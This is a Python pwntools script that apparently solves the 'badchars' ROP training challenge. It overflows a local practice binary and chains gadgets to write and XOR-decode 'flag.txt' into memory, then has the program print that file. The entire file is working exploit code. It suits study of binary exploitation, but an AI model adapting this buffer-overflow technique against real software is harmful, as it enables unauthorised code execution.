from pwn import *
#from pwnlib import *

buf = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
#setting registers
buf += p64(0x40069c)
buf += b'flbh/tyt'
buf += p64(0x601038)
buf += p64(0x0101010101010101)
buf += p64(0x60103a) #r15
buf += p64(0x400634)

buf += p64(0x400630)
buf += p64(0x4006a2)


buf += p64(0x60103b) #r15
buf += p64(0x400630)
buf += p64(0x4006a2)

buf += p64(0x60103c) #r15
buf += p64(0x400630)
buf += p64(0x4006a2)

buf += p64(0x60103e) #r15
buf += p64(0x400630)

buf += p64(0x4006a3)
buf += p64(0x601038)

buf += p64(0x400510)
#buf += p64(0x601028)*3

p = process("./badchars")
p.recvline()
p.recvline()
p.recvline()
p.recvline()
#gdb.attach(p)
p.sendline(buf)
p.interactive()
p.close()